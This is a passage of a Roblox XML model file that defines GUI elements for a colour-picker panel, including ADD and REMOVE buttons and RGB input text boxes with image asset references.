										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">ArrowButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX1901DD9482844A2F899D74594FF02996">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4292411647</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>3</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX3233BD3D6EB5457B87F77CE598FB4495">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">AddButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>1</XS>
											<XO>-40</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>19</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">ADD</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX8AD0AC1FF8214B37A7EAC9BA6C3B755E">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">RemoveButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>90</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>58</XO>
											<YS>0</YS>
											<YO>19</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">REMOVE</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXCE522307001B488EA8AF0EBA3BB654E0">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Shadow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX6188968B199E4960845ACA527A0DDB28">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">true</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Options</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>3</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-3</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX8D8D28334B4448AF8EECADF6A4ACDDBD">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">ColorOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>10</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX7F4F0B3C29A743F49026030E329C179A">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Color</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX88D997F30B5A46B2893F1DC7E2C55A2E">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">RInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>35</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX20DD2184AD2F4E4094A36610211620A7">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX2F0F32BC2F5B462D8C09A3082353B555">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBXA92BBD31E46948298F85CAF88E940A1B">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294901760</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBXF7A3164922B847C383CA38A571040193">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBXC6884CAB8E5E4EB6A72664C2D41DDE54">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">GInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>72</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBXA77416DBF6E5454890C2CF243AC0D0F7">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX6EEAED2964F3411D8C4192346A87E1F0">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX7C2934BB871247B88D75FE95BAE08656">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278255360</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX987F3FF75F4E4E04A0237DA41BED2594">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBX2351310CF74A492E9A0000337F3516E3">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">BInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>109</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX5E89AC43366A4C14A74F48A6A9F8B260">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX391B5E7F5DDC428B9A0EDCFE4157E492">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
